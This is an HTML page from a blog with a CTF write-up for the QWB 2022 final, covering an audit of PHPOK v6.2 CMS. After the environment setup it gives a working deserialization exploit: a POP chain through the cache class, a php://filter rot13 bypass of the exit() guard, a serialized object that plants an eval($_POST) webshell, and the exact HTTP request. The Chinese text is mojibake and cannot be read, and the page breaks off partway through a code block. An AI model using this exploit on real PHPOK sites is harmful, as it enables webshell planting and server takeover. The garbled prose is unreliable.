<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="å®¡å®¡PHP  QWB FINAL - CMS (PHPOK v6.2)ä¸Šæ¬¡å®¡è®¡PHPè¿˜æ˜¯åœ¨å¤§äºŒï¼Œæ¢äº†ç”µè„‘åä¹Ÿä¸€ç›´æ²¡æœ‰é…ç½®xdebugç¯å¢ƒï¼Œå¯¼è‡´å½“å¤©åªèƒ½ç¡¬ç€å¤´çš®çœ‹ä»£ç ï¼Œçœ‹äº†ä¸€å¤©åå…¥å£å’Œå‡ºå£éƒ½æ‰¾åˆ°äº†ï¼Œå¯æƒœæ²¡æ³•debugä¸çŸ¥é“å‡½æ•°å’Œå‚æ•°çš„æƒ…å†µï¼ŒåŠ ä¹‹å¯¹ä¸€äº›å‡½æ•°æ•æ„Ÿåº¦ä¸å¤Ÿï¼Œé”™è¿‡äº†ã€‚ä»Šå¤©å°±ä¸“é—¨æŠ½äº†ä¸€ä¸‹åˆæ—¶é—´æ¥é…ç½®ç¯å¢ƒå’Œdebugè¿™ä¸ªæ´ ç¯å¢ƒé…ç½®ç¯å¢ƒé…ç½®æœ‰ç‚¹æŠ˜è…¾äººï¼Œå› ä¸ºç»™äº†dockerfileï¼Œä½†m1proæœ‰">
<meta property="og:type" content="article">
<meta property="og:title" content="NS - QWB FINAL &amp;&amp; WMCTF WEB">
<meta property="og:url" content="http://w1mps.github.io/2022/08/22/QWB%202022%20FINAL/index.html">
<meta property="og:site_name" content="Trashbox 4 outx!">
<meta property="og:description" content="å®¡å®¡PHP  QWB FINAL - CMS (PHPOK v6.2)ä¸Šæ¬¡å®¡è®¡PHPè¿˜æ˜¯åœ¨å¤§äºŒï¼Œæ¢äº†ç”µè„‘åä¹Ÿä¸€ç›´æ²¡æœ‰é…ç½®xdebugç¯å¢ƒï¼Œå¯¼è‡´å½“å¤©åªèƒ½ç¡¬ç€å¤´çš®çœ‹ä»£ç ï¼Œçœ‹äº†ä¸€å¤©åå…¥å£å’Œå‡ºå£éƒ½æ‰¾åˆ°äº†ï¼Œå¯æƒœæ²¡æ³•debugä¸çŸ¥é“å‡½æ•°å’Œå‚æ•°çš„æƒ…å†µï¼ŒåŠ ä¹‹å¯¹ä¸€äº›å‡½æ•°æ•æ„Ÿåº¦ä¸å¤Ÿï¼Œé”™è¿‡äº†ã€‚ä»Šå¤©å°±ä¸“é—¨æŠ½äº†ä¸€ä¸‹åˆæ—¶é—´æ¥é…ç½®ç¯å¢ƒå’Œdebugè¿™ä¸ªæ´ ç¯å¢ƒé…ç½®ç¯å¢ƒé…ç½®æœ‰ç‚¹æŠ˜è…¾äººï¼Œå› ä¸ºç»™äº†dockerfileï¼Œä½†m1proæœ‰">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/image-20220822191901305.png">
<meta property="article:published_time" content="2022-08-22T02:39:40.000Z">
<meta property="article:modified_time" content="2022-08-22T11:33:20.127Z">
<meta property="article:author" content="outx">
<meta property="article:tag" content="CTF">
<meta property="article:tag" content="Web">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/image-20220822191901305.png">
    
    
      
        
          <link rel="shortcut icon" href="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>NS - QWB FINAL &amp;&amp; WMCTF WEB</title>
    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
<meta name="generator" content="Hexo 5.4.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" "Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/paper/">Paper</a></li>
         
          <li><a href="/archives/">Archives</a></li>
         
          <li><a href="/categories/">Categories</a></li>
         
          <li><a href="/tags/">Tags</a></li>
         
          <li><a href="/search/">Search</a></li>
        
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        
        <li><a class="icon" aria-label="Next post " href="/2022/08/17/DFJK2022/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top " href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post " href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://w1mps.github.io/2022/08/22/QWB%202022%20FINAL/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://w1mps.github.io/2022/08/22/QWB%202022%20FINAL/&text=NS - QWB FINAL &amp;&amp; WMCTF WEB"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://w1mps.github.io/2022/08/22/QWB%202022%20FINAL/&title=NS - QWB FINAL &amp;&amp; WMCTF WEB"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://w1mps.github.io/2022/08/22/QWB%202022%20FINAL/&is_video=false&description=NS - QWB FINAL &amp;&amp; WMCTF WEB"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=NS - QWB FINAL &amp;&amp; WMCTF WEB&body=Check out this article: http://w1mps.github.io/2022/08/22/QWB%202022%20FINAL/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://w1mps.github.io/2022/08/22/QWB%202022%20FINAL/&title=NS - QWB FINAL &amp;&amp; WMCTF WEB"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://w1mps.github.io/2022/08/22/QWB%202022%20FINAL/&title=NS - QWB FINAL &amp;&amp; WMCTF WEB"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://w1mps.github.io/2022/08/22/QWB%202022%20FINAL/&title=NS - QWB FINAL &amp;&amp; WMCTF WEB"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://w1mps.github.io/2022/08/22/QWB%202022%20FINAL/&title=NS - QWB FINAL &amp;&amp; WMCTF WEB"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://w1mps.github.io/2022/08/22/QWB%202022%20FINAL/&name=NS - QWB FINAL &amp;&amp; WMCTF WEB&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://w1mps.github.io/2022/08/22/QWB%202022%20FINAL/&t=NS - QWB FINAL &amp;&amp; WMCTF WEB"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#QWB-FINAL-CMS-PHPOK-v6-2"><span class="toc-number">1.</span> <span class="toc-text">QWB FINAL - CMS (PHPOK v6.2)</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE"><span class="toc-number">1.1.</span> <span class="toc-text">ç¯å¢ƒé…ç½®</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EXP"><span class="toc-number">1.2.</span> <span class="toc-text">EXP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Track-It"><span class="toc-number">1.3.</span> <span class="toc-text">Track It</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">1.4.</span> <span class="toc-text">æ€»ç»“</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#WMCTF-JAVA"><span class="toc-number">2.</span> <span class="toc-text">WMCTF - JAVA</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF"><span class="toc-number">2.1.</span> <span class="toc-text">æ€è·¯</span></a></li></ol></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index py4">
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        NS - QWB FINAL &amp;&amp; WMCTF WEB
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">outx</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2022-08-22T02:39:40.000Z" itemprop="datePublished">2022-08-22</time>
        
      
    </div>


      
    <div class="article-category">
        <i class="fas fa-archive"></i>
        <a class="category-link" href="/categories/Notes/">Notes</a>
    </div>


      
    <div class="article-tag">
        <i class="fas fa-tag"></i>
        <a class="tag-link-link" href="/tags/CTF/" rel="tag">CTF</a>, <a class="tag-link-link" href="/tags/Web/" rel="tag">Web</a>
    </div>


    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <blockquote>
<p>å®¡å®¡PHP</p>
</blockquote>
<h1 id="QWB-FINAL-CMS-PHPOK-v6-2"><a href="#QWB-FINAL-CMS-PHPOK-v6-2" class="headerlink" title="QWB FINAL - CMS (PHPOK v6.2)"></a>QWB FINAL - CMS (PHPOK v6.2)</h1><p>ä¸Šæ¬¡å®¡è®¡PHPè¿˜æ˜¯åœ¨å¤§äºŒï¼Œæ¢äº†ç”µè„‘åä¹Ÿä¸€ç›´æ²¡æœ‰é…ç½®xdebugç¯å¢ƒï¼Œå¯¼è‡´å½“å¤©åªèƒ½ç¡¬ç€å¤´çš®çœ‹ä»£ç ï¼Œçœ‹äº†ä¸€å¤©åå…¥å£å’Œå‡ºå£éƒ½æ‰¾åˆ°äº†ï¼Œå¯æƒœæ²¡æ³•debugä¸çŸ¥é“å‡½æ•°å’Œå‚æ•°çš„æƒ…å†µï¼ŒåŠ ä¹‹å¯¹ä¸€äº›å‡½æ•°æ•æ„Ÿåº¦ä¸å¤Ÿï¼Œé”™è¿‡äº†ã€‚ä»Šå¤©å°±ä¸“é—¨æŠ½äº†ä¸€ä¸‹åˆæ—¶é—´æ¥é…ç½®ç¯å¢ƒå’Œdebugè¿™ä¸ªæ´</p>
<h2 id="ç¯å¢ƒé…ç½®"><a href="#ç¯å¢ƒé…ç½®" class="headerlink" title="ç¯å¢ƒé…ç½®"></a>ç¯å¢ƒé…ç½®</h2><p>ç¯å¢ƒé…ç½®æœ‰ç‚¹æŠ˜è…¾äººï¼Œå› ä¸ºç»™äº†dockerfileï¼Œä½†m1proæœ‰ç‚¹æï¼Œæ‰€ä»¥è®°å½•ä¸‹è¸©çš„å‘ã€‚</p>
<p>é¦–å…ˆï¼Œå®˜æ–¹ç»™çš„Dockerfileï¼Œåœ¨æ­¤åŸºç¡€ä¸Šæ·»åŠ php7.2-xdebugè¿›è¡Œå®‰è£…</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">FROM ubuntu:18.04</span><br><span class="line"></span><br><span class="line">ENV DEBIAN_FRONTEND noninteractive</span><br><span class="line"></span><br><span class="line">COPY sources.list /etc/apt/sources.list</span><br><span class="line"></span><br><span class="line">RUN apt-get update &amp;&amp; apt-get install apache2 -y</span><br><span class="line">COPY apache2.conf /etc/apache2/apache2.conf</span><br><span class="line">COPY smity2.tar.gz /root/smity2.tar.gz</span><br><span class="line">COPY flag /flaaaaaaggggggggggg</span><br><span class="line">COPY study.sql /root/study.sql</span><br><span class="line"></span><br><span class="line">RUN apt-get update</span><br><span class="line">RUN apt-get install -y mariadb-server mariadb-client unzip software-properties-common php7.2 php7.2-xml php7.2-mysqli php7.2-xmlrpc php7.2-soap php7.2-intl php7.2-gd php7.2-zip php7.2-mbstring libapache2-mod-php php-xml php-xmlrpc php-soap php-intl php-gd php-zip php-mbstring unzip php7.2-xdebug vim</span><br><span class="line"></span><br><span class="line">RUN groupadd www \</span><br><span class="line">    &amp;&amp; useradd --shell /sbin/nologin -g www www \</span><br><span class="line">    &amp;&amp; rm -rf /var/www/html/* \</span><br><span class="line">    &amp;&amp; tar zxvf /root/smity2.tar.gz -C / \</span><br><span class="line">    &amp;&amp; chmod 755 -R /var/www/html \</span><br><span class="line">    &amp;&amp; chmod 777 -R /var/www/html/_* \</span><br><span class="line">    &amp;&amp; chmod 777 -R /var/www/html/task/ \</span><br><span class="line">    &amp;&amp; service mysql start \</span><br><span class="line">    &amp;&amp; mysql -uroot -proot -e &quot;create user phpok identified by &#x27;phpok&#x27;;&quot; \</span><br><span class="line">    &amp;&amp; mysql -uroot -proot -e &quot;create database phpok;use phpok;source /root/study.sql;&quot; \</span><br><span class="line">    &amp;&amp; mysql -uroot -proot -e &quot;grant all on phpok.* to phpok@&#x27;localhost&#x27; identified by &#x27;phpok&#x27; with grant option;&quot; \</span><br><span class="line">    &amp;&amp; mysql -uroot -proot -e &quot;flush privileges;&quot; \</span><br><span class="line">    &amp;&amp; rm -rf /var/lib/apt/lists/* \</span><br><span class="line">    &amp;&amp; chmod 644 /flaaaaaaggggggggggg \</span><br><span class="line">    &amp;&amp; a2enmod rewrite \</span><br><span class="line">    &amp;&amp; service apache2 restart</span><br><span class="line"></span><br><span class="line">ENTRYPOINT service apache2 restart &amp;&amp; service mysql restart &amp;&amp; sh</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>æ›¿æ¢source.listä¸ºarm64ç”¨çš„ï¼Œéœ€è¦å¯¹åº”ä¸Šubuntuç‰ˆæœ¬ï¼Œè¿™é‡Œæ˜¯18.04ç‰¹æœ‰ï¼Œåˆ«çš„ä¼šæŠ¥é”™ï¼ˆå®æµ‹ï¼‰</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">deb http://mirrors.ustc.edu.cn/ubuntu-ports/ bionic-updates main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.ustc.edu.cn/ubuntu-ports/ bionic-updates main restricted universe multiverse</span><br><span class="line">deb http://mirrors.ustc.edu.cn/ubuntu-ports/ bionic-security main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.ustc.edu.cn/ubuntu-ports/ bionic-security main restricted universe multiverse</span><br><span class="line">deb http://mirrors.ustc.edu.cn/ubuntu-ports/ bionic-backports main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.ustc.edu.cn/ubuntu-ports/ bionic-backports main restricted universe multiverse</span><br><span class="line">deb http://mirrors.ustc.edu.cn/ubuntu-ports/ bionic main universe restricted</span><br><span class="line">deb-src http://mirrors.ustc.edu.cn/ubuntu-ports/ bionic main universe restricted</span><br></pre></td></tr></table></figure>

<p>ç„¶åé…ç½®docker-composeæ–¹ä¾¿å¯åŠ¨ï¼Œéœ€è¦æ³¨æ„ç¯å¢ƒçš„php.iniæ˜¯è¦æ›¿æ¢apache2ç›®å½•çš„è€Œécliç›®å½•çš„ï¼ŒåŒæ—¶ç•™æ„ä¸éœ€è¦æ˜ å°„9000</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">version: &#x27;3&#x27;</span><br><span class="line">services:</span><br><span class="line">  myimg:</span><br><span class="line">    image: myimg:0.1</span><br><span class="line">    build:</span><br><span class="line">      context: .</span><br><span class="line">      dockerfile: Dockerfile</span><br><span class="line">    ports:</span><br><span class="line">      - 8081:80</span><br><span class="line">      # - 9000:9000</span><br><span class="line">    volumes:</span><br><span class="line">      - ./var/www/html/:/var/www/html/</span><br><span class="line">      - ./php.ini:/etc/php/7.2/apache2/php.ini</span><br><span class="line">    stdin_open: true</span><br><span class="line">    tty: true</span><br></pre></td></tr></table></figure>

<p>æœ€åå°±æ˜¯åœ¨php.iniä¸­è¿½åŠ xdebugçš„å‚æ•°ï¼Œè¿™é‡Œæ˜¯åœ¨ç½‘ä¸Šæ‰¾çš„åŸºç¡€ä¸Šæ”¹çš„ï¼Œä½†æ˜¯åŸç‰ˆé‡Œé¢æœ‰ä¸€è¡Œç”¨#æ³¨é‡Šçš„å†…å®¹ï¼Œåœ¨vscodeé‡Œçœ‹èµ·æ¥ä¸€ç‚¹æ¯›ç—…ä¹Ÿæ²¡æœ‰ï¼Œä½†æ˜¯è§£æphp.iniæ—¶ä¼šå‡ºé”™ï¼Œä½†æ˜¯å¯¹äºapache2çš„é‡å¯æ²¡æœ‰ä»»ä½•å½±å“ï¼ˆåç»­é€šè¿‡/var/logç›¸å…³æ—¥å¿—æ’æŸ¥å‡ºæ¥çš„ï¼‰ï¼Œåœ¨è¿™é‡Œè¸©äº†å‘ï¼Œéœ€ç•™æ„</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[xdebug]</span><br><span class="line">zend_extension=&quot;/usr/lib/php/20170718/xdebug.so&quot;</span><br><span class="line">xdebug.remote_handler=&quot;dbgp&quot;</span><br><span class="line"></span><br><span class="line">xdebug.remote_host=&quot;192.168.xx.xx&quot;</span><br><span class="line">xdebug.remote_port=&quot;9000&quot;</span><br><span class="line">xdebug.remote_log=&quot;/var/log/php/xdebug.log&quot;</span><br><span class="line">xdebug.remote_enable=1</span><br><span class="line">xdebug.idekey=&quot;outx&quot;</span><br><span class="line"></span><br><span class="line">;å¯ç”¨ä»£ç è‡ªåŠ¨è·Ÿè¸ª</span><br><span class="line">xdebug.auto_trace = On</span><br><span class="line">;å¯ç”¨æ€§èƒ½æ£€æµ‹åˆ†æ</span><br><span class="line">xdebug.profiler_enable = On</span><br><span class="line">xdebug.profiler_enable_trigger = On</span><br><span class="line">xdebug.profiler_output_name = &quot;profiler.out.%t.%p&quot;</span><br></pre></td></tr></table></figure>



<h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><p>æ ¹æ®å‘¨æœ«ç¡¬çœ‹äº†ä¸€å¤©çš„æˆæœï¼Œpopé“¾æ˜¯ç°æˆçš„ï¼Œåˆ©ç”¨framework/engine/cache.phpä¸­çš„cacheç±»ï¼Œç•™æ„ææ„æ–¹æ³•å’Œsaveæ–¹æ³•</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">public function __destruct()</span><br><span class="line">&#123;</span><br><span class="line">	//echo &quot;&lt;pre&gt;&quot;.print_r($this-&gt;key_list,true).&quot;&lt;/pre&gt;&quot;;</span><br><span class="line">	//echo &quot;&lt;pre&gt;&quot;.print_r(count($this-&gt;key_list),true).&quot;&lt;/pre&gt;&quot;;</span><br><span class="line">	$this-&gt;save($this-&gt;key_id,$this-&gt;key_list);</span><br><span class="line">	$this-&gt;expired();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public function save($id,$content=&#x27;&#x27;)</span><br><span class="line">&#123;</span><br><span class="line">	if(!$id || $content === &#x27;&#x27; || !$this-&gt;status)&#123;</span><br><span class="line">		return false;</span><br><span class="line">	&#125;</span><br><span class="line">	$this-&gt;_time();</span><br><span class="line">	$content = serialize($content);</span><br><span class="line">	$file = $this-&gt;folder.$id.&quot;.php&quot;;</span><br><span class="line">	file_put_contents($file,&#x27;&lt;?php exit();?&gt;&#x27;.$content);</span><br><span class="line">	$this-&gt;_time();</span><br><span class="line">	$this-&gt;_count();</span><br><span class="line">	return true;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>å½“æ—¶ä¸ºä»€ä¹ˆæ‰¾åˆ°è¿™ä¸ªåœ°æ–¹å‘¢ï¼Œå°±æ˜¯ä»file_put_contentsè¿™ä¸ªsinkç‚¹æœè¿‡æ¥çš„ï¼Œç„¶åç¡®å®šäº†è¿™ä¸ªé“¾æ˜¯å¯ä»¥æ‰“ååºåˆ—åŒ–çš„ï¼Œè¿™é‡Œå¯ä»¥ç”¨php://filterç»•è¿‡è¿™ä¸ªexit</p>
<p>æ„é€ class</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class cache </span><br><span class="line">&#123;</span><br><span class="line">  protected $timeout = 1800;</span><br><span class="line">	protected $status = true;</span><br><span class="line">	protected $prefix = &#x27;qinggan_&#x27;;</span><br><span class="line">	protected $keyfile = &#x27;&#x27;;</span><br><span class="line">	protected $folder = &#x27;php://filter/string.rot13/resource=/var/www/html/_cache/&#x27;;</span><br><span class="line">	protected $key_id = &#x27;outx&#x27;;</span><br><span class="line">	protected $key_list = &#x27;&lt;?cuc riny($_CBFG[\&#x27;bhgk\&#x27;]);?&gt;&#x27;;</span><br><span class="line">	protected $debug = false;</span><br><span class="line">	protected $time;</span><br><span class="line">	//</span><br><span class="line">	private $time_use = 0;</span><br><span class="line">	private $time_tmp = 0;</span><br><span class="line">	private $count = 0;</span><br><span class="line">&#125;</span><br><span class="line">echo(urlencode(urlencode(serialize(new cache())))); // ä¸¤æ¬¡ç¼–ç ä¸»è¦æ˜¯ä¸ºäº†ç¬¬ä¸€æ¬¡ä¼ é€’è¿›å»ä¸å½±å“åç»­è§£æ</span><br><span class="line"></span><br><span class="line">O%253A5%253A%2522cache%2522%253A12%253A%257Bs%253A10%253A%2522%2500%252A%2500timeout%2522%253Bi%253A1800%253Bs%253A9%253A%2522%2500%252A%2500status%2522%253Bb%253A1%253Bs%253A9%253A%2522%2500%252A%2500prefix%2522%253Bs%253A8%253A%2522qinggan_%2522%253Bs%253A10%253A%2522%2500%252A%2500keyfile%2522%253Bs%253A0%253A%2522%2522%253Bs%253A9%253A%2522%2500%252A%2500folder%2522%253Bs%253A56%253A%2522php%253A%252F%252Ffilter%252Fstring.rot13%252Fresource%253D%252Fvar%252Fwww%252Fhtml%252F_cache%252F%2522%253Bs%253A9%253A%2522%2500%252A%2500key_id%2522%253Bs%253A4%253A%2522outx%2522%253Bs%253A11%253A%2522%2500%252A%2500key_list%2522%253Bs%253A29%253A%2522%253C%253Fcuc%2Briny%2528%2524_CBFG%255B%2527bhgk%2527%255D%2529%253B%253F%253E%2522%253Bs%253A8%253A%2522%2500%252A%2500debug%2522%253Bb%253A0%253Bs%253A7%253A%2522%2500%252A%2500time%2522%253BN%253Bs%253A15%253A%2522%2500cache%2500time_use%2522%253Bi%253A0%253Bs%253A15%253A%2522%2500cache%2500time_tmp%2522%253Bi%253A0%253Bs%253A12%253A%2522%2500cache%2500count%2522%253Bi%253A0%253B%257D</span><br></pre></td></tr></table></figure>

<p>burp</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /api.php?c=call&amp;f=index&amp;data=&#123;%22m_picplayer%22:%220%26type_id%3Dformat_ext_all%26x%5Bform_type%5D%3Durl%26x%5Bcontent]=O%253A5%253A%2522cache%2522%253A12%253A%257Bs%253A10%253A%2522%2500%252A%2500timeout%2522%253Bi%253A1800%253Bs%253A9%253A%2522%2500%252A%2500status%2522%253Bb%253A1%253Bs%253A9%253A%2522%2500%252A%2500prefix%2522%253Bs%253A8%253A%2522qinggan_%2522%253Bs%253A10%253A%2522%2500%252A%2500keyfile%2522%253Bs%253A0%253A%2522%2522%253Bs%253A9%253A%2522%2500%252A%2500folder%2522%253Bs%253A56%253A%2522php%253A%252F%252Ffilter%252Fstring.rot13%252Fresource%253D%252Fvar%252Fwww%252Fhtml%252F_cache%252F%2522%253Bs%253A9%253A%2522%2500%252A%2500key_id%2522%253Bs%253A4%253A%2522outx%2522%253Bs%253A11%253A%2522%2500%252A%2500key_list%2522%253Bs%253A29%253A%2522%253C%253Fcuc%2Briny%2528%2524_CBFG%255B%2527bhgk%2527%255D%2529%253B%253F%253E%2522%253Bs%253A8%253A%2522%2500%252A%2500debug%2522%253Bb%253A0%253Bs%253A7%253A%2522%2500%252A%2500time%2522%253BN%253Bs%253A15%253A%2522%2500cache%2500time_use%2522%253Bi%253A0%253Bs%253A15%253A%2522%2500cache%2500time_tmp%2522%253Bi%253A0%253Bs%253A12%253A%2522%2500cache%2500count%2522%253Bi%253A0%253B%257D%22&#125; HTTP/1.1</span><br></pre></td></tr></table></figure>

<h2 id="Track-It"><a href="#Track-It" class="headerlink" title="Track It"></a>Track It</h2><p>æ¥ä¸‹æ¥å°±ä¸€æ­¥ä¸€æ­¥ä»sourceåˆ°sinkç‚¹åˆ†æ</p>
<blockquote>
<p>framework/api/call_control.php#index_f()ï¼Œå¯¹åº”åˆ°URLåˆ™æ˜¯api.php?c=call&amp;f=indexï¼Œä¸­é—´å‚æ•°å†™åˆ°æ³¨é‡Šä¸­äº†</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span 